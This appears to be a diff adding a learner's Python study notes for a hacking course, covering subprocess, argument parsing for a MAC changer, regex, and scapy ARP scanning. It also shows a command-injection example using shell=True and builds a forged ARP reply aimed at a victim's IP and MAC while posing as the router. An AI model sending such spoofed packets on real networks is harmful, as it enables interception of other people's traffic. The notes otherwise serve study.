@@ -1,0 +1,196 @@
+import subprocess
+
+#subprocess is similar to import os module execute system command
+
+subprocess.call("ifconfig",shell=True)
+subprocess.call("ifconfig eth0",shell=True)
+
+subprocess.call("ifconfig eth0;ls",shell=True)
+
+this is not secure execation something hacker me manipulate commands ; && | to execute other command shell command 
+to avoid this we not using multiple command sequence in a single line we execute the command inside list one by one 
+we remove shell=True to avoid execute a single sequence of command 
+
+subprocess.call(["ifconfig","eth0"])
+#we execute command one by one in list so  their is no manipulation it return  with error not execute other command
+
+ifconfig_result = subprocess.check_output(["ifconfig",interface])
+#we cannot save directly the result produced by the command rather we use subprocess.check_output to do the stuff
+#we assign a variable to get the output produced by the command and then manipulate the variable to get our resulting output
+
+----------------------------------------------------------------------------------------------------------------------------
+
+import optparse
+
+#to parse value as parameter in a commandline we use this module,it give a rich set feature in dealing with command line argments
+python macchanger.py --interface eth0 --mac aa:bb:cc:dd:ee:ff
+
+parser=optparse.OptionParser()	
+#create a parser object to use it on future code
+
+parser.add_option("-i","--interface",dest="interface",help="Interface to change the mac address")
+#adding the options like -i or --interface switches, dest this where the passed values get saved and help display the help msg python macchanger.py --help
+
+parser.parse_args()
+#this line tell the program to understand about argument passed in commandline 
+
+(options,arguments)=parser.parse_args()	
+#we save the passed argument into variable by assign a variable  like this
+#the parser.parse_args() funtion returns a value to this 2 varible options and arguments
+#options is nothingbut the value passed in switch eg wlan0 and aa:bb:cc:dd:ee:ff
+#arguments is nothingbut the switch itself eg --interface and --mac or -i and -m
+
+if not options.interface:
+	parser.error("[-] Specify an Interface use python macchanger --help for more details")
+
+#if their is an interface or value passed in commandline is not sufficient or not given we check the value if it is present,
+#we leave it if it is not we through an error saying please specifiy an interface
+
+---------------------------------------------------------------------------------------------------------------------------
+
+import argparse
+
+#successor of optparse updated version of optparse , optparse doesn't get upgrade so better shift to argparse to pass argument in command line
+
+parser=argparse.ArgumentParser()	
+#create a parser object to use it on future code to do magic
+
+parser.add_argument("-i","--interface",dest="interface",help="Interface to change the mac address")
+#adding the options like -i or --interface switches, dest this where the passed values get saved and help display the help msg python macchanger.py --help
+
+parser.parse_args()
+#this line tell the program to understand about argument passed in commandline 
+
+options=parser.parse_args()	
+#we save the passed argument into variable by assign a variable  like this
+#the parser.parse_args() funtion returns a value to this 1 varible options but previous version optparse use two argument
+#options is nothingbut the value passed in switch eg wlan0 and aa:bb:cc:dd:ee:ff
+
+-----------------------------------------------------------------------------------------------------------------------
+
+import re
+
+#regular expression module which is super powerful to extract specify words in a content
+
+ifconfig_result = subprocess.check_output(["ifconfig",interface])
+current_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",ifconfig_result)
+#current_mac gets store the value which matches the pattern 
+#but the search method only returns the first occurence of the search pattern
+
+print current_mac.group(0)
+#only prints the first occurence of the search pattern due to search method
+
+current_mac = re.findall(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",ifconfig_result) 
+print current_mac
+#print all mac in type list 
+
+-------------------------------------------------------------------------------------------------------------------------
+
+import scapy.all as scapy
+
+#scapy is the ,ost powerful module to deal with raw ip packets , capture,create,generate, with the help of predefined protocols use to snif, inject packet,packet analysis and more. type ls(),lsc(),ls(Ether)
+scapy.arping("192.168.43.1/24")
+#simple 1-line command to perform arp request anf if the host is presented 
+we get a replay and represent in a easy way ,but we create a more robust code with many functionality
+
+arp_request=scapy.ARP(pdst ="192.168.43.1/24")
+#initialize a arp request packet with ip dst
+#creating arp_request object with dst_ip=user_input_ip
+
+arp_request.show()
+#show the brief overview of Packet Structure
+
+arp_request.summary()
+#show just a summary of what the packet does in a one line
+
+broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+#create a broadcast object to have Ether frame property with dst_mac =ff:ff:ff:ff:ff:ff
+
+arp_request_broadcast = broadcast/arp_request
+#combine the Ether frame to arp_request to send
+
+answered, unanswered = scapy.srp(arp_request_broadcast,timeout=1)
+#scapy.srp to send the packet in layer2 Ether fram which returns 2 value answered,unanswered
+#timeout=1 specify wait for 1 sec not till you getting replay
+
+arp_respond = scapy.ARP(op=2,pdst="192.168.43.43",hwdst="08:00:27:70:92:1d",psrc="192.168.43.1")
+#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")
+
+print arp_respond.show()
+#show the brief overview of Packet Structure
+
+print arp_respond.summary()
+#show just a summary of what the packet does in a one line
+
+scapy.send(arp_respond)
+#send the created arp packet to the specified destination
+
+scapy.send(arp_respond,verbose=False,count=4)
+#verbose is False to not display the verbose message on the screen and packet count is 4
+
+----------------------------------------------------------------------------------------------------------------------------
+
+import time 
+#time module is the popular module use to calculate time of start of a program and end to sleep the program for particular time
+
+time.sleep(2)
+#program sleep for two seconds
+
+----------------------------------------------------------------------------------------------------------------------------
+
+import sys
+#to execute sys command
+
+sys.stdout.flush()
+#flush the stdout saved in buffer 
+#because in thecase of dynamic printing all stdout are saved in buffer and will print after the program terminate
+#this commands tells not to save in buffer print as it was
+
+print "\r[+] send two packets "+str(count),
+#this command overwrite the previous print statement and print again and again in the output by overwriting the previous value
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Exception Handling
+
+try:
+	
+	if something error occurs except block execute
+
+
+expect:
+	print "Error occured"
+
+
+try:
+	a=1
+	while True:
+		print a
+		a=a+1
+		#a will be continuously printing in the output to cancelwe use ctrl+c
+
+except KeyboardInterrupt:
+	print "Detected ctrl+c exiting" 
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
